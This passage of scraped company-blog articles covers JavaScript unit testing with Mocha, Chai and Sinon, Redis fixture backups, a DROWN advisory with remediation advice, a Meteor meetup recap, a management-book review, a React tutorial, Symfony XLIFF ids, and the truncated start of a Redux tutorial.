chai, our workspace/test/math.js will now look like:\nvar should = require('chai').should();\r\nvar math = require('../math');\r\n\r\ndescribe('square', function() {\r\n    it('should return the square of given numbers', function() {\r\n        math.square(2).should.equal(4);\r\n        math.square(3).should.equal(9);\r\n    });\r\n});\r\n\nAnd the output is a bit different in case of failure:\n# Output with mocha and assert\r\nAssertionError: 6 == 9\r\n# Output with mocha and chai\r\nAssertionError: expected 6 to equal 9\r\n\nAs of now we have everything we need to test a JavaScript file. The tests we write are easy to read and their output provides useful information in case of success as well as in case of failure. However, our square function had very few logic. What will happen if we want to test a function depending on other services?\nHow to handle function dependencies in your tests?\nLet\u2019s add another service, called equation.js, in our workspace. It will contain a discriminant function, that uses the square function defined in the service above.\nvar math = require('./math');\r\n\r\nmodule.exports = {\r\n  discriminant: function(a, b, c) {\r\n    return math.square(b) - 4*a*c;\r\n  }\r\n};\r\n\nThen, let\u2019s write a test of discriminant in /workspace/test/equation.js. This test looks like the test of square:\nvar should = require('chai').should();\r\nvar equation = require('../equation');\r\n\r\ndescribe('discriminant', function() {\r\n    it('should return the discriminant of given numbers', function() {\r\n        equation.discriminant(3, 2, -5).should.equal(64);\r\n        equation.discriminant(3, 11, 7).should.equal(37);\r\n    });\r\n});\r\n\nAs we already said, when we launch the tests with mocha (./node_modules/.bin/mocha) all the files in test are used. We now have the following output:\n  discriminant\r\n    \u2713 should return the discriminant of given numbers\r\n\r\n  square\r\n    \u2713 should return the square of given numbers\r\n\r\n  2 passing (14ms)\r\n\nOur two methods are tested. That\u2019s great!\nLet\u2019s break square and see what happens. As before we replace a*a by a+a and here is the test result:\n  discriminant\r\n    1) should return the discriminant of given numbers\r\n\r\n  square\r\n    2) should return the square of given numbers\r\n\r\n\r\n  0 passing (20ms)\r\n  2 failing\r\n\r\n  1) discriminant should return the discriminant of given numbers:\r\n\r\n      AssertionError: expected -62 to equal 37\r\n      + expected - actual\r\n\r\n      --62\r\n      +37\r\n\r\n      at Context.<anonymous> (test/equation.js:7:48)\r\n\r\n  2) square should return the square of given numbers:\r\n\r\n      AssertionError: expected 6 to equal 9\r\n      + expected - actual\r\n\r\n      -6\r\n      +9\r\n\r\n      at Context.<anonymous> (test/math.js:7:31)\r\n\nThe test of square fails which is the expected behavior but the test of discriminant also fails which means we did not write a unit test. The first consequence is that we don\u2019t know where our code is broken. Is it square or discriminant that we have to fix?\nTo unit test the discriminant function, we have to \u201cstub\u201d the square function, that is to say we have to fake its behavior so that the test of the discriminant does not depend on a function of another service. We can do this with Sinon. You can install it with the following command:\nnpm install sinon\nThen, we can modify the test file /workspace/test/equation.js:\nvar should = require('chai').should();\r\nvar sinon = require('sinon');\r\n\r\nvar equation = require('../equation');\r\nvar math = require('../math');\r\n\r\nvar stub;\r\n\r\ndescribe('discriminant', function() {\r\n    before(function() {\r\n        stub = sinon.stub(math, 'square').returns(4);\r\n    });\r\n\r\n    after(function () {\r\n        stub.restore();\r\n    });\r\n\r\n    it('should return the discriminant', function() {\r\n        equation.discriminant(3, 2, -5).should.equal(64);\r\n        equation.discriminant(3, 11, 7).should.equal(-80);\r\n    });\r\n});\r\n\nYou see two functions before and after. These functions define what to do before and after launching the tests. Here, we initialize the stub in the before function, and we restore the initial behavior of square in the after function. After defining a stub, it is very important to restore it, because otherwise the stub will be active in following tests, and thus will break them.\nThe stub allows us to define a fake return value for the square function. It means that whenever this function is called, it will return the value 25. As a consequence, when we call the discriminant function with the a, b and c parameters, the b value won\u2019t be used because the stub returns a specific value.\nNow if square is broken, we have the following output:\n  discriminant\r\n    \u2713 should return the discriminant\r\n\r\n  square\r\n    1) should return the square of given numbers\r\n\r\n\r\n  1 passing (28ms)\r\n  1 failing\r\n\r\n  1) square should return the square of given numbers:\r\n\r\n      AssertionError: expected 6 to equal 9\r\n      + expected - actual\r\n\r\n      -6\r\n      +9\r\n\r\n      at Context.<anonymous> (test/math.js:7:31)\r\n\nThe test of discrimant is ok which is what we want since there is no error in the discrimant function. The test of square is failing which gives us a good idea of where we made a mistake in our code.\nThe stub allows us to isolate the logic of the discriminant function, and that\u2019s why Sinon is very useful.\nWhat\u2019s next?\nNow that you understand the purpose of each library of the Mocha-Sinon-Chai stack, it is time to write some more complex tests. It will be the subject of the second part of our tutorial, in which you will learn about sandboxes, tests on functions using callbacks, or using promises among many other things. Be ready!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThibaut Gatouillat\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRedis is a fantastic tool to handle data in an amazingly simple and rapid manner. If you\u2019re not using it yet, you should read some posts about it. Here\u2019s a way you can manage redis fixtures in your projects.\nRedis and microservices\nIn our current web project we use Redis to handle hot data that can be updated using microservices.\n\nTo initialize our development environment, we use scripts that populate Redis from the Postgresql databases of our microservices. Our problem: As we have quite a large set of data, it was taking time to populate Redis. This should not be the case in production, but in a development environment this is quite common. \nThe quickest and most simple solution we found is to load a backup of our Redis store. Fortunately for us, Redis automatically creates a backup file (/var/lib/redis/dump.rdb) that is constantly updated. All we have to do to restore a backup is to replace the /var/lib/redis/dump.rdb file with our own. This article provides a great explanation on how it is done. As the file is quite large, we need to compress it. This is where we were met with a significant problem that was not covered in the article: the tar command corrupts the dump.rdb file. We simply solve it by using the bzip2 command instead.\nLoading the fixtures in Vagrant and Docker\nIf you are using Vagrant like us for your development environment, you need to run the following script inside the vm:\ncd /var/www/myapp/current\r\ncp data/backupredis.rdb.bz2 data/dump.rdb.bz2\r\nbunzip2 data/dump.rdb.bz2\r\nsudo service redis-server stop\r\nsudo mv data/dump.rdb /var/lib/redis/dump.rdb\r\nsudo chown redis:redis /var/lib/redis/dump.rdb\r\nsudo service redis-server start\r\n\nNotice that you need to run it as root.If you\u2019re not using it yet, \u2026\n\u2013 You can build a new image with the correct dump.rdb.\n\u2013 You can put the dump.rdb in a shared folder and you replace it during the start.sh of your container.\nUpdating the fixtures\nAs the project goes on, we need new versions of the fixtures.\nTo update our backup file with the data from one environment we use the following script:\n#!/usr/bin/env bash\r\nrm -f ../data/backupredis.rdb.bz2\r\nscp root@IP_TARGET_ENVIRONMENT:/var/lib/redis/dump.rdb ../data/backupredis.rdb\r\nbzip2 ../data/backupredis.rdb\r\n\nWe then commit and push the file so that developers can quickly get the last version of the fixtures.\nFor Docker users, if have the build a new image solution, you need to rebuild the image of your container at the end of this step.\nConclusion\nDealing with the backup of a Redis store was quite simple \u2013 another of the reasons why Redis is an awesome tool. If you liked this article and don\u2019t want to miss the next one, you can follow me on Twitter.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nA new security vulnerability has been detected in HTTPS yesterday: DROWN. The attack can decrypt a HTTPS connection. Impact: hackers can steal your users data, such as their password, credit card number and personal information.\nBasically, your server is vulnerable if it is able to handle HTTPS connections through SSLv2 or previous versions of the protocol. Likewise, if your server does not support SSLv2 but your certificate\u2019s private key is also used on another server that supports it, the exploit remains possible.\nAnd this is true even if it is used by another protocol (e.g. POP3 protocol for your mail server).\nHow can I check if my server is vulnerable?\nThanks to the checker provided by the DROWN website, you can check if your server is vulnerable to DROWN.\nNevertheless, it might return an empty result if your domain has never been crawled by the drownattack.com team. Fortunately, there is a python utility available on GitHub. You can scan your server thanks to it and detect if your server is vulnerable. Everything is explained in the documentation.\nOops, I\u2019m vulnerable. How do I fix that?\nYou must disable SSLv2 on your servers, in every service: webserver, mail server\u2026 Use TLS only. It is simple with Apache or Nginx but it might not be as simple for other technologies. Once again, read the counter measure on the DROWN website!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRemy Luciani\r\n  \t\t\t\r\n  \t\t\t\tTheodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. \r\n\r\n\"The Prod is life!\"  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few weeks ago, I went to a Meteor meetup. On this occasion, I had the chance to attend a highly instructive debate about the future of a framework I like. I will try to give you a quick summary of everything I heard.\nOf course, without sponsor, there is no event, I would like to thank 42mg\u2019s team, an open source software which aims at helping people with project management. I would also like to thank the PCF\u00a0to provide us a place for this meetup in its headquarters, a supernatural concrete building erected by Oscar Niemeyer. The inside of the building is particularly inspiring.\nFinally, I address a special thanks to Breaz.io, a platform for developers to meet recruiters, for their help.\nWhy people use MeteorJs?\nThe main lesson I learned from my MeteorJs experiences is that it is freakingly simple. If you doubt this, I invite you to read another article I wrote a few weeks ago about how to deploy a MeteorJs application in less than 10 minutes.\nTo quickly summarize this point, I would say that by nature, Meteor is strongly monolithic, it limits the number of technologies you can plug on it. The consequence entailed is Meteor works out of the box. If you need to add a component, go to Atmosphere and if you find your package, add it in one command line and it will work.\nThis makes Meteor the quickest framework to bring value into your application you started from scratch. One of the attendee told us about his experience: \u201cUsing Meteor made me save 2 work-months on my project\u201d\nThe criticism we hear about Meteor\n\nThe thing I heard the most about Meteor is that it is slow and heavy.\nOne attendee explained that the inner Meteor builder, when operating a large number of files, can become slow and that he even had to use Webpack with meteor to operate on his builds.\nThe package manager, Atmosphere, is non standard and not npm compliant, so, if you want to add a npm package, rewrite it, or wrap it yourself.\nYou can\u2019t add easily add every technology on a Meteor, for example, you are almost married to MongoDb\nJavascript is a turbulent ecosystem, the current components in a NodeJs environment are easy to reorganise, not Meteor.\nThere is currently no bright example of large Meteor application used by a strong company mainly because its package ecosystem is too much insular against the overwhelming npm\u2019s one.\nWe also heard that you can\u2019t plug a technology and play. You can\u2019t use a part of the solution and use another templating solution for example. It lack modularity. That\u2019s the monolithic part.\n\nWhat is planned for the future and why it is uncertain\n\nReact is coming with its packages and community to shake the little Meteor ecosystem.\nNPM is coming.\nMeteor nested methods are still using callbacks instead of promises, but it may change soon.\nAs a result, Meteor is initiating a transition phase to get close to npm. This entails the frustration of the trained users that see the features of their beloved framework relocated. These guys are worried to see Meteor loose Blaze and become very far from what it was initially.\nAccording to a guy in the assembly: \u201cThe migration to Meteor 2, if that ever sees the light of day, has all chances to be a tough one\u201d.\n\nBut it has all chances to be bright\nMeteor:\n\nHas money. The company raised more than 11 million dollars at its beginning and still has money left, furthermore, they won\u2019t stop here.\nHas an active community\nIs moving forward. Contributions, patches, versions, evolutions are happening relentlessly.\nIs adapting and evolves quickly\nHas a promising 1.3 version\nThe 1.3 version of Meteor is really willing to change the framework, indeed, it opens to asynchronous comportment, but better, it adds a package import supporting npm that seems stronger than Webpack\nMeteor is a full stack boilerplate solution for js web project. With it, you have a backend AND a frontend solution to develop. It was shown as the only viable competitor since SailJS hasn\u2019t enough traction.\nHas an outstanding adoption curve\nA lot of people want to try Meteor, it shows that this framework generates interest from developers.\n\nMeteor is blessed with a great community, far more active than Sails\u2019 one. It also offer a good usability and a fine kickstart for your project, saving about 2 months with no business value.\nMeteor needs guidelines\nA nice project, Mantra, showed up, it is aimed at providing guidelines to build a cutting edge scalable application based on Meteor. It allows npm uses and provides a testing environment which is great for Meteor newcomers\nConclusions:\nAs one might understand, Meteor is on the brink of a revolution. Its identity as a framework is at stake and it may regress to a rather complete kickstart. But, in the current process, we can witness hope from its community, the company who backed it and the technical choices of its maintainers.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThibaut Cheymol\r\n  \t\t\t\r\n  \t\t\t\tThibaut is a full-stack web developer. Passionate about Javascript, he has a preference for ReactJs  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyrille Hugues\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThere are relatively few books which I have found valuable enough to re-read, and\u00a0\u201cHigh Output Management\u201d, by Andy Grove, the ex-president of Intel, is one of them. It is my objective in this article to get one Theodoer to read this book. So if you do, please let me know!\nIn order to encourage you to read the book, here I outline 3\u00a0points from it that you may find interesting:\nChoose the right type of indicator!\u00a0\nGrove talks about\u00a0the importance of choosing the right indicators, two types of which, I outline below:\n\nGated indicators, where a process is not continued until quality standards are met.\u00a0You absolutely do not continue until a problem\u00a0is resolved, compared to a process indicator, where you measure that something is wrong, but you continue going as you were, with some minor changes.\nPaired indicators, where there is both a maximum and a minimum indicator to keep stock at an optimum. This a very lean mentality, do not always presume more is better: do what needs to be done and no more.\n\nMotivate before training!\u00a0\nGrove notes that training is only effective to the degree that people are motivated, so motivate first and provide training second.\u00a0He points out that self-actualisation, or \u201cwhat I can be, I must be\u201d, is the highest form of motivation, and he believes this to be underpinned by either being competence (process) or achievement (outcome) driven.\nCoach people as individuals!\u00a0\nGrove argues strongly for regular scheduled one to ones between coach and coachee. He argues that they produce a totally different type of interaction that a casual phone call and are important to address big issues and to improve the output of the coachee.\u00a0He also points out that coaching should \u00a0be different depending on the task-relevant maturity of the coachee:\n\nlow maturity, requires that the coach dictates tasks, explaining what, when, and how\nmedium maturity, requires two way support and guidance\nhigh maturity, requires establishment of objectives and monitoring\n\nWould I recommend this book? Yes, absolutely.\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSam Parlett\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is React?\nAccording to its developers, React is a JavaScript library for creating user interfaces. It is designed to solve one problem: building large applications with data that changes over time. It has had an ultra-fast success lately and is used in many famous websites like Facebook, Instagram, Netflix, AirBnb, BBC, Dailymotion, Deezer, Docker, Dropbox, IMDb, Paypal, Reddit, WhatsApp, Yahoo and many more.\nThat\u2019s a nice piece of information but it does not answer the questions a programmer would ask himself in the first place: when should I use this library? Why is it better than others, and why should I change? What are the buisness benefits of using it? Is it easy to learn? Is it easy or fast to use?\nSadly, most of these questions should be answered by personal experience: try and you\u2019ll see. What we can do here however, is to take a look at the library and then try to understand the trend it has had lately.\nSo, to introduce React, the best description is: It is a view layer.\nOnly a view layer.\nBasicaly, React is made to build \u201ccomponents\u201d, a number of functions, variables with a template, bundled together into a self-contained, independent, reusable brick that renders into HTML with all the javascript necessary for the user interactions. For those who are used to deal with Angular 1.x, React components are comparable to directives in many ways. This last point is the reason why full MVC frameworks like Angular or Backbone can not be compared with React. React is only made to build views, not to handle the rest of the logic necessary in a complete front-end app, for instance making calls to a server, sharing data between components or emiting/receiving application-wide events.\nThe answer given by Facebook to have this logic around React, is a Pattern calld Flux, which will be the subject of another post.\nHow do I use React?\nReact key concepts are props and state, they are two attributes present in every component and contain particular data. On the one hand, props are data passed from the outside. Every time the props change a rendering of the component is triggered (but the component is not reinitialized). On the other hand, the state is where the variables that define the status of the component are stored. They can be updated from within the component with the setState method, also present in every component, which updates the state and re-renders the component\nBut no more awaiting, let\u2019s make a component to see the key features of the library: an orderable and interactive column of cards!\nTo bootstrap the project, we will use webpack (React works extremely well with webpack\u2019s CommonJS system). Here is the package.json:\n// package.json\r\n{\r\n  \"dependencies\": {\r\n    \"babel-core\": \"6.4.5\",\r\n    \"babel-loader\": \"6.2.1\",\r\n    \"babel-preset-es2015\": \"6.3.13\",\r\n    \"babel-preset-react\": \"6.3.13\",\r\n    \"react\": \"0.14.7\",\r\n    \"react-dom\": \"0.14.7\",\r\n    \"webpack\": \"1.12.12\",\r\n    \"webpack-dev-server\": \"1.14.1\"\r\n  },\r\n  \"babel\": {\r\n    \"presets\": [\r\n      \"es2015\",\r\n      \"react\"\r\n    ]\r\n  }\r\n}\r\n\nThe tree will look like this:\nwebpack.config.js\r\npackage.json\r\n.\r\n\u251c\u2500 src/\r\n\u2502   \u251c\u2500\u2500 app.jsx\r\n\u2502   \u251c\u2500\u2500 cardList.jsx\r\n\u2502   \u2514\u2500\u2500 card.jsx\r\n\u2514\u2500 www/\r\n    \u2514\u2500\u2500 index.html\r\n\nWait, what?! app.jsx? What is JSX?\nJSX is a templating language used in the rendering functions of React components, it enables to have an XML-like formatting that makes really easy to see how the component will render. It is transpiled into vanilla javascript to be executed in a browser: for instance, return <div><div> will become return React.createElement('div'). It is possible to use make components with only javascript but the code is much more dense and wordy. More information about the JSX specs here.\nSo, webpack will be configured to transpile our components into javascript before making our bundle. The config file will be like this:\n// webpack.config.js\r\nvar path = require(\"path\");\r\n\r\nmodule.exports = {\r\n  entry: \"./src/app.jsx\",\r\n  output: {\r\n      path: path.join(__dirname, \"www\"),\r\n      filename: \"bundle.js\",\r\n  },\r\n  devtool: \"inline-source-map\",\r\n  module: {\r\n    loaders: [\r\n      {\r\n        test: /\\.jsx?$/,\r\n        exclude: /(node_modules|bower_components)/,\r\n        loader: \"babel\",\r\n      },\r\n    ]\r\n  },\r\n  resolve: {\r\n    extensions: [\"\", \".js\", \".jsx\"],\r\n  },\r\n  devServer: {\r\n    contentBase: \"www/\",\r\n    inline: true,\r\n    colors: true,\r\n    progress: true,\r\n  }\r\n};\r\n\nAn index.html needs to be put in the www/ directory to fetch the static data like the bundle.js file:\n<!-- www/index.html-->\r\n<!DOCTYPE html>\r\n<html>\r\n  <head>\r\n    <meta charset=\"UTF-8\" />\r\n    <title>Hello React</title>\r\n  </head>\r\n  <body>\r\n    <div id=\"baseElement\"></div>\r\n    <script src=\"/bundle.js\"></script>\r\n  </body>\r\n</html>\r\n\nNow the app.jsx is the entry point of our configuration, it will import all our dependencies (React also works extremely well with es6):\n// src/app.jsx\r\nimport React from 'react'\r\nimport ReactDOM from 'react-dom'\r\n\r\nimport CardList from './cardList.jsx'\r\n\r\nlet cards = [\r\n    {'name': 'Super card', 'id': 1},\r\n    {'name': 'Other card', 'id': 2},\r\n    {'name': 'Last card', 'id': 3}\r\n];\r\n\r\nReactDOM.render(<CardList cards={cards} />, document.getElementById(\"baseElement\"))\r\n\nThe interesting part is this last line: ReactDOM is a sub-library of React wich is only aimed at attaching a component to a part of the current DOM\u00a0and rendering the component. It also have a serverside counterpart that can be used to pre-render components directly in the server, but we will see that later.\nNow that our app is all ready to be started, let\u2019s start the React stuff. Here is a simple version of our cardlist component:\n// src/cardList.jsx\r\nimport React from 'react'\r\n\r\nclass CardList extends React.Component {\r\n    render() {\r\n        let elements = this.props.cards.map((element) => {\r\n            return (<li key={element.id}>{element.name}</li>)\r\n        })\r\n        return <ul>{elements}</ul>\r\n    }\r\n}\r\n\r\nexport default CardList\r\n\r\n\nLet\u2019s start a webpack-dev-server to see how that renders:\n\n<div id=\"baseElement\">\r\n    <ul data-reactid=\".0\">\r\n        <li data-reactid=\".0.0\">Super card</li>\r\n        <li data-reactid=\".0.1\">Other card</li>\r\n        <li data-reactid=\".0.2\">Last card</li>\r\n    </ul>\r\n</div>\r\n\nSuch list, very templating, wow!\nBy what kind of sorcery is all that working? Well first, we extended here a base Class of React that builds components. And what about this render() method? It is a method required in each component that is called every time the components needs to be processed into HTML and subsequent Javascript. In there we create an array of <li>s, each containing a card title. We can point out that variables have to be put inside brackets {}. Finally, we put this array in a <ul> element, and React will render all contained elements one after the other.\nAlso, there are a lot of data-reactids, they are attributes necessary for the core of the library, and they should not be touched by any piece of the application, not even for styling!\nHere we go, we have a list of all our card names in a bullet list!\nBut we talked about some state earlier, why is it not used? Well this component is very simple, it is only a function to render some data, no user interaction will edit the apparence. A component like this is dumb in two ways: in its way of working, but also because using React for a component simple like this is. What we need is some user interaction ! We will enable the user to choose the order of the cards by adding some up/down arrows to move up or down cards.\nSo, the component will start by copying the list of cards of the props into the state by editing the component to look like this:\n    constructor(props){\r\n        super(props)\r\n        this.state = props\r\n    }\r\n    render() {\r\n        let elements = this.state.cards.map((element) => {\r\n            return (<li key={element.id}>{element.name}</li>)\r\n        })\r\n        return <ul>{elements}</ul>\r\n    }\r\n\nThis is necessary if we want to edit the data, since the props are immutable. Now, if we edit the state, the rendering will be affected accordingly.\nWe will now add a function to change the order of a particular card:\n    moveCard(from, to){\r\n        cards = this.state.cards\r\n        movedCard = cards.splice(from, 1)\r\n        cards.splice(to, 0, movedCard)\r\n        this.setState({\r\n            cards: cards\r\n        })\r\n    }\r\n\nThe beginning of this function is pretty straightforward, we copy the list and change the order of a particular item. The major concept to remember is the this.setState. This function is the only way that should be used to edit the state. It replace the items given in arguments, and triggers a render() to apply the modification to the DOM.\nWe need to bind the arrows onclick events with moveCard. The rendering function will then look like:\n    render() {\r\n        let elements = this.state.cards.map((element, index) => {\r\n            return (\r\n                <li key={index}>\r\n                    {element.name}\r\n                    <span onClick={() => this.moveCard(index, index-1)}>Up</span>\r\n                    <span onClick={() => this.moveCard(index, index+1)}>Down</span>\r\n                </li>\r\n            )\r\n        })\r\n        return <ul>{elements}</ul>\r\n    }\r\n\nNotice that the onClick syntax is different from the html standard onclick. The reason is that React uses a cross-browser type of event, with the same methods on all browsers. The list of available events and further information can be found here\nAnother special attribute is className that computes into the basic HTML class. This is mandatory to handle the styling.\nAnd if we look at the browser, it works! Only thing, there is a down arrow even on the last card, and an up arrow on the first card. Clicking them make the javascript crash. We will then add some conditions:\n    render() {\r\n        let elements = this.state.cards.map((element, index) => {\r\n            return (\r\n                <li key={index}>\r\n                    {element.name}\r\n                    {\r\n                        index != 0 ? <span onClick={() => this.moveCard(index, index-1)}>Up</span> : ''\r\n                    }\r\n                    {\r\n                        index != this.state.cards.length -1 ? <span onClick={() => this.moveCard(index, index+1)}>Down</span> : ''\r\n                    }\r\n                </li>\r\n            )\r\n        })\r\n        return <ul>{elements}</ul>\r\n    }\r\n\nReact does not have a ng-if-like function to have conditionnal elements, here\u00a0is the\u00a0reason\u00a0with some examples\u00a0to have the right behavior.\nReact is made to have as small components as possible, let\u2019s cut this big component to simplify all this. The new component will look like this:\nThe final cardList is:\n// src/cardList.jsx\r\nimport React from 'react'\r\nimport Card from './card'\r\n\r\nclass CardList extends React.Component {\r\n    constructor(props){\r\n        super(props)\r\n        this.state = props\r\n    }\r\n    moveCard(fromIndex, toIndex) {\r\n        let cards = this.state.cards\r\n        let movedCard = cards.splice(fromIndex, 1)[0]\r\n        cards.splice(toIndex, 0, movedCard)\r\n        this.setState({\r\n            cards: cards\r\n        })\r\n    }\r\n    render() {\r\n        let elements = this.state.cards.map((element, index) => {\r\n            let moveUp, moveDown;\r\n            if (index != 0)\r\n                moveUp = this.moveCard.bind(this, index, index-1)\r\n            if (index != this.props.cards.length - 1)\r\n                moveDown = this.moveCard.bind(this, index, index+1)\r\n            return (\r\n                <Card\r\n                    key={index}\r\n                    card={element}\r\n                    moveUp={moveUp}\r\n                    moveDown={moveDown}\r\n                />\r\n            )\r\n        })\r\n        return <ul>{elements}</ul>\r\n    }\r\n}\r\n\r\nexport default CardList\r\n\nAnd our new card is:\n// src/card.jsx\r\nimport React from 'react'\r\n\r\nclass Card extends React.Component {\r\n    render() {\r\n        return (\r\n            <li>\r\n                {this.props.card.name}\r\n                {\r\n                    this.props.moveUp ? <span onClick={this.props.moveUp}> Up</span> : ''\r\n                }\r\n                {\r\n                    this.props.moveDown ? <span onClick={this.props.moveDown}> Down</span> : ''\r\n                }\r\n            </li>\r\n        )\r\n    }\r\n}\r\n\r\nexport default Card\r\n\nOur component is now quite advanced, we could also add a lot of sugar around it, like adding an <input /> to add some new cards, or adding some styling around this basic HTML-only component.\nAnd\u2026 That\u2019s it!\nWell, that\u2019s it for the first chapter on the React and Flux serie. Now that we have the bases to build React components, we will use them to create a complex multi-component system to integrate in a real page.\nI hope this litle tutorial could help you understand React better.\u00a0If you liked this, keep up to date for the oncoming second part about the Flux architecture.\nMore to read about the subject can be found here:\n\nReact developer tools, a must have to work on components: https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en\nReact\u2019s documentation: https://facebook.github.io/react/docs/getting-started.html\nA very good article that also explains React basics: http://blog.andrewray.me/reactjs-for-stupid-people/\nThe ES2015 specifications: http://babeljs.io/docs/learn-es2015/\nA good setup of webpack to work with React: https://robots.thoughtbot.com/setting-up-webpack-for-react-and-hot-module-replacement\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCorentin de Boisset\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tXLIFF?\nXLIFF is one of the 3 different formats you can use for translation in Symfony.\nIt is the recommended format because of its standard use by professional translators.\n<trans-unit id=\"42\">\r\n    <source>french_food</source>\r\n    <target>Omelette du fromage</target>\r\n</trans-unit>\r\n\nIn Symfony, ids in XLIFF have no particular meaning, all you need is for them to be distinct in the same file.\nEverything is about the source, which becomes the key in your translation catalogue once the file is loaded.\nUsually, people use numbers as id, as you can see in Symfony documentation.\nProblem with numbers\nYou have harder conflicts to resolve when working with git:\nif two contributors used the same ids, one of them has to renumber its translations to be sure ids are unique.\nIf a contributor decides to rearrange the translations in a file to group them by category:\n\nEither he/she renumbered all the ids and then it\u2019s a nightmare with git.\nOr the file is not sorted by id anymore, and you don\u2019t know what the next id you have to use for the next translation is.\n\nSimple solution\nDo yourself a favor, use the source as the id!\nNo more meaningless number, no more headache with numbering.\n<trans-unit id=\"french_food\">\r\n    <source>french_food</source>\r\n    <target>Omelette du fromage</target>\r\n</trans-unit>\r\n\nOne of the hidden benefits is that Symfony will now yell at you if you have a duplicated source in your file, whereas it was silently overwriting the duplications before.\nNeat!\nEdit: I updated Symfony documentation following this post since core contributors felt the same way as I do.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tImage credits: egghead.io\nA few weeks ago, I was idly browsing through Hacker News, and read a headline about Redux, which I understood was yet another thing that was supposed to get along well with React. Javascript fatigue had already got its grip on me, so I paid little attention, until I read the following features of Redux:\n\nIt enforces functional programming and ensures predictability of the app behavior\nIt allows for isomorphic app, where most of the logic is shared between the client and the server code\nA time-traveling debugger?! Is that even possible?\n\nIt seemed like an elegant solution to manage the state of React applications, plus who would say no to time travel? So I got in, read the examples in the docs and this fantastic tutorial by @teropa: A Comprehensive Guide to Test-First Development with Redux, React, and Immutable (which is a major source of inspiration for this article).\nI liked it. The code is elegant. The debugger is insanely great. I mean \u2013 look at this (click to see in action):\n\nWhat follows is the first part of a tutorial that will hopefully guide you to the principles of the Redux way of doing things\u00a9. It is 